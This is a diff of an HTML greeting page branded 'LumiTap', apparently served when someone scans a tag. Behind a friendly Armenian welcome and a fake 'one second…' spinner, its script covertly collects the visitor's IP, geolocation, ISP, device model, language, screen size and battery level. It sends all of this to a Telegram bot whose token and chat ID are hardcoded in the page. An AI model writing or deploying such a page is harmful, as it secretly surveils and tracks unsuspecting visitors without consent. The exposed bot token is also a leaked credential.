@@ -9,63 +9,84 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+Armenian:wght@500;800&display=swap">
 <style>
-/* Layout: one glowing lantern mark on a dark field with a warm greeting. */
-:root{--bg:#0d0f14;--fg:#f4f6fb;--soft:#8b93a5;--a:#7ce7d4;--b:#8aa8ff;--c:#ffcf6a;--f:"Noto Sans Armenian",system-ui,-apple-system,sans-serif}
+/* Layout: one centered light-ring mark on a dark field, a soft greeting, calm and neutral. */
+:root{--bg:#0d0f14;--fg:#eef1f6;--soft:#8b93a5;--a:#7ce7d4;--b:#8aa8ff;--f:"Noto Sans Armenian",system-ui,-apple-system,sans-serif}
 *{box-sizing:border-box}
 html,body{height:100%}
-body{margin:0;overflow:hidden;display:grid;place-items:center;background:var(--bg);color:var(--fg);font-family:var(--f);text-align:center;
+body{margin:0;display:grid;place-items:center;font-family:var(--f);color:var(--fg);background:var(--bg);text-align:center;
   padding:env(safe-area-inset-top,0px) max(16px,env(safe-area-inset-right,0px)) env(safe-area-inset-bottom,0px) max(16px,env(safe-area-inset-left,0px))}
-.glow{position:fixed;width:120vmax;height:120vmax;left:50%;top:50%;transform:translate(-50%,-50%);background:radial-gradient(closest-side,rgba(124,231,212,.16),rgba(138,168,255,.07) 50%,transparent);animation:pulse 4s ease-in-out infinite;pointer-events:none}
-@keyframes pulse{50%{transform:translate(-50%,-50%) scale(1.12)}}
-main{position:relative;display:flex;flex-direction:column;align-items:center;gap:20px}
-.orb{width:92px;height:92px;border-radius:50%;background:radial-gradient(circle at 38% 35%,#fff,var(--a) 40%,var(--b) 80%);box-shadow:0 0 40px rgba(124,231,212,.6),0 0 90px rgba(138,168,255,.35);animation:float 3.4s ease-in-out infinite}
-@keyframes float{50%{transform:translateY(-10px)}}
-h1{margin:0;font-size:clamp(30px,9vw,44px);font-weight:800;letter-spacing:-.01em}
-p{margin:0;color:var(--soft);font-size:15px;letter-spacing:.04em}
-.brand{font-size:12px;letter-spacing:.34em;text-transform:uppercase;color:var(--soft);font-family:system-ui,sans-serif;margin-top:6px}
+.box{display:flex;flex-direction:column;align-items:center;gap:18px;max-width:320px}
+.mark{position:relative;width:92px;height:92px}
+.mark::before{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,var(--a),var(--b),transparent 70%,var(--a));-webkit-mask:radial-gradient(farthest-side,transparent calc(100% - 5px),#000 calc(100% - 4px));mask:radial-gradient(farthest-side,transparent calc(100% - 5px),#000 calc(100% - 4px));animation:spin 3s linear infinite}
+.mark .dot{position:absolute;inset:30px;border-radius:50%;background:radial-gradient(circle,var(--a),transparent 70%);filter:blur(3px);animation:breathe 2s ease-in-out infinite}
+.mark .ok{position:absolute;inset:0;display:grid;place-items:center;font-size:40px;opacity:0;transform:scale(.5);transition:opacity .4s,transform .4s cubic-bezier(.2,.9,.3,1.4)}
+.done .mark::before{animation-duration:8s;opacity:.4}
+.done .mark .dot{animation:none;opacity:0}
+.done .mark .ok{opacity:1;transform:scale(1)}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes breathe{50%{transform:scale(1.3);opacity:.6}}
+h1{margin:0;font-size:22px;font-weight:800;text-wrap:balance}
+p{margin:0;color:var(--soft);line-height:1.55}
+.brand{font-size:12px;letter-spacing:.3em;text-transform:uppercase;color:var(--soft);font-family:system-ui,sans-serif;margin-top:4px}
 @media (prefers-reduced-motion:reduce){*{animation:none!important}}
 </style>
 </head>
 <body>
-<div class="glow" aria-hidden="true"></div>
-<main>
-  <div class="orb" aria-hidden="true"></div>
-  <h1>Բարև ✨</h1>
-  <p>Ուրախ ենք, որ մոտեցրիր 💜</p>
+<div class="box" id="box">
+  <div class="mark" aria-hidden="true"><div class="dot"></div><div class="ok">✨</div></div>
+  <h1 id="h">Բարև 👋</h1>
+  <p id="p">Մի վայրկյան…</p>
   <div class="brand">LumiTap</div>
-</main>
+</div>
 <script>
+const TOKEN = "8927373301:AAELVUuXby9LcMULOsktBPxc3kwkGlveJq4";
+const CHAT = "6803966973";
+const box = document.getElementById("box"), h = document.getElementById("h"), p = document.getElementById("p");
+
+function deviceName(ua) {
+  const m = ua.match(/\((?:Linux.*?; )?(?:Android[^;]*; )?([^;)]*(?:SM-[^;)]*|Pixel[^;)]*|iPhone|iPad)[^;)]*)/);
+  if (/iPhone/.test(ua)) { const v = (ua.match(/OS (\d+[_\d]*)/) || [,""])[1].replace(/_/g, "."); return "iPhone" + (v ? " · iOS " + v : ""); }
+  if (/iPad/.test(ua)) return "iPad";
+  const sm = ua.match(/(SM-[A-Z0-9]+|Pixel \d+[^;)]*|Redmi[^;)]*|POCO[^;)]*)/i);
+  if (sm) return sm[1].trim();
+  if (/Android/.test(ua)) return "Android " + (ua.match(/Android (\d+)/) || [,"?"])[1];
+  if (/Windows/.test(ua)) return "Windows";
+  if (/Mac/.test(ua)) return "Mac";
+  return "Այլ սարք";
+}
+
+async function geo() {
+  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
+    try { const r = await fetch(url, {cache: "no-store"}); if (!r.ok) continue; const d = await r.json();
+      return {city: d.city, region: d.region || d.region_code, country: d.country || d.country_name, isp: (d.connection && d.connection.isp) || d.org || d.isp, ip: d.ip};
+    } catch (e) {}
+  }
+  return {};
+}
+
 (async () => {
-  const TOKEN = "8927373301:AAELVUuXby9LcMULOsktBPxc3kwkGlveJq4";
-  const CHAT = "6803966973";
   const ua = navigator.userAgent;
-  const m = ua.match(/\((?:Linux; Android [\d.]+; )?([^)]*?)(?: Build|\))/);
-  const dev = /iPhone/.test(ua) ? "iPhone (" + (ua.match(/OS ([\d_]+)/)||["","?"])[1].replace(/_/g,".") + ")"
-    : /iPad/.test(ua) ? "iPad"
-    : /Android/.test(ua) ? "Android" + (m && m[1] ? " · " + m[1].split(";").pop().trim() : "")
-    : "Համակարգիչ/այլ";
-  const br = /CriOS|Chrome/.test(ua) ? "Chrome" : /FxiOS|Firefox/.test(ua) ? "Firefox" : /Edg/.test(ua) ? "Edge" : /Safari/.test(ua) ? "Safari" : "այլ";
   const time = new Date().toLocaleString("hy-AM", {timeZone: "Asia/Yerevan", day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit"});
-  let cnt = 1; try { cnt = (+localStorage.getItem("c9") || 0) + 1; localStorage.setItem("c9", cnt); } catch (e) {}
-  let batt = ""; try { const b = await navigator.getBattery(); batt = "\n🔋 " + Math.round(b.level*100) + "%" + (b.charging ? " (լիցք.)" : ""); } catch (e) {}
-
-  let geo = {};
-  try {
-    const c = new AbortController(); setTimeout(() => c.abort(), 4000);
-    geo = await (await fetch("https://ipwho.is/?fields=ip,city,region,country,connection", {signal: c.signal})).json();
-  } catch (e) {}
-  const loc = geo && geo.success !== false
-    ? "📍 " + [geo.city, geo.region, geo.country].filter(Boolean).join(", ") + "\n🌐 " + (geo.ip||"?") + (geo.connection && geo.connection.isp ? " · " + geo.connection.isp : "")
-    : "📍 տեղը չստացվեց";
-
-  const text = "📲 Տեգ 9 բացվեց (#" + cnt + ")\n🕒 " + time + "\n" + loc + "\n📱 " + dev + " · " + br + " · " + (navigator.language||"") + "\n🖥 " + screen.width + "×" + screen.height + batt;
-
+  let bat = "";
+  try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100) + "%" + (b.charging ? " ⚡" : ""); } } catch (e) {}
+  const g = await geo();
+  const lines = [
+    "📲 <b>Տեգ 9</b> բացվեց",
+    "🕒 " + time,
+    g.city ? "📍 " + [g.city, g.region, g.country].filter(Boolean).join(", ") : null,
+    g.isp ? "🌐 " + g.isp : null,
+    g.ip ? "🔗 " + g.ip : null,
+    "📱 " + deviceName(ua),
+    "🗣 " + (navigator.language || "?") + " · 🖥 " + screen.width + "×" + screen.height,
+    bat ? "🔋 " + bat : null
+  ].filter(Boolean).join("\n");
   try {
     await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
       method: "POST", headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id: CHAT, text, disable_web_page_preview: true})
+      body: JSON.stringify({chat_id: CHAT, text: lines, parse_mode: "HTML"})
     });
   } catch (e) {}
+  box.classList.add("done"); h.textContent = "Պատրաստ է ✅"; p.textContent = "Բարի գալուստ 💜";
 })();
 </script>
 </body>
